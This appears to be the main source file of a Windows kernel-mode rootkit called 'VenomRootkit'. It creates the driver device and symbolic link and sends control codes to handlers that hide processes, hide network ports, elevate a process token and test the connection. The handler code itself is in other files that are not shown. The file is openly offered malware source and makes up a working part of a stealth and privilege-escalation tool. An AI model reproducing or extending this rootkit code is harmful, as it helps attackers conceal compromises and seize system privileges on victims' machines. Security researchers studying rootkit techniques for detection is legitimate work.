#include "IoctlHandlers.h"
#include <ntddk.h>
#include "Venom.h"
#include "Ioctl.h"

// Prototypes
void VenomUnload(PDRIVER_OBJECT DriverObject);
NTSTATUS VenomCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS VenomDeviceControl(PDEVICE_OBJECT, PIRP Irp);

extern "C" NTSTATUS
DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	UNREFERENCED_PARAMETER(RegistryPath);

	auto status = STATUS_SUCCESS;
	PDEVICE_OBJECT DeviceObject = nullptr;
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\VenomRootkit");

	bool symLinkCreated = false;
	do
	{
		UNICODE_STRING devName = RTL_CONSTANT_STRING(L"\\Device\\VenomRootkit");
		status = IoCreateDevice(DriverObject, 0, &devName, FILE_DEVICE_UNKNOWN, 0, TRUE, &DeviceObject);
		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "failed to create device (0x%08X)\n", status));
			break;
		}

		status = IoCreateSymbolicLink(&symLink, &devName);
		if (!NT_SUCCESS(status)) {
			KdPrint((DRIVER_PREFIX "failed to create sym link (0x%08X)\n", status));
			break;
		}
		symLinkCreated = true;

	} while (false);

	if (!NT_SUCCESS(status)) {
		if (symLinkCreated)
			IoDeleteSymbolicLink(&symLink);
		if (DeviceObject)
			IoDeleteDevice(DeviceObject);
	}

	DriverObject->DriverUnload = VenomUnload;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = VenomCreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = VenomDeviceControl;

	return STATUS_SUCCESS;
}

NTSTATUS VenomCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {

	UNREFERENCED_PARAMETER(DeviceObject);

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

NTSTATUS VenomDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
	auto stack = IoGetCurrentIrpStackLocation(Irp);
	NTSTATUS status = STATUS_SUCCESS;

	switch (static_cast<VenomIoctls>(stack->Parameters.DeviceIoControl.IoControlCode)) {

	case VenomIoctls::HideProcces:

		status = IoctlHandlers::HideProcess(Irp);
		break;

	case VenomIoctls::TestConnection:

		status = IoctlHandlers::TestConnection(Irp, stack->Parameters.DeviceIoControl.OutputBufferLength);
		break;

	case VenomIoctls::Elevate:

		status = IoctlHandlers::ElevateToken(Irp);
		break;

	case VenomIoctls::HidePort:

		status = IoctlHandlers::HidePort(Irp);
		break;
	default:
		Irp->IoStatus.Information = 0;
		status = STATUS_INVALID_DEVICE_REQUEST;
		break;
	}

	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}

void VenomUnload(PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\VenomRootkit");

	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(DriverObject->DeviceObject);
}